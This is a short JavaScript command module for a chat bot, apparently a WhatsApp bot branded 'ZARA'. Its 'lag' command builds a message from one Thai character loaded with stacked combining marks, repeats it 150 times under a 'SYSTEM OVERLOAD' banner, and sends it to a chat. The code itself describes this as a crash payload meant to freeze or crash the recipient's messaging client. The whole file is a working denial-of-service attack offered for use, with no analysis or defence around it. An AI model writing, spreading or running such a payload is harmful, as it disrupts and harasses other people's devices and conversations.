module.exports = {
    name: 'lag',
    description: 'Send a high-complexity Unicode crash payload',
    async execute(client, message, args) {
        const heavyChar = "ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎";
        const payload = `🔥 *ZARA SYSTEM OVERLOAD* 🔥\n` + heavyChar.repeat(150);
        await client.sendMessage(message.from, payload);
    }
};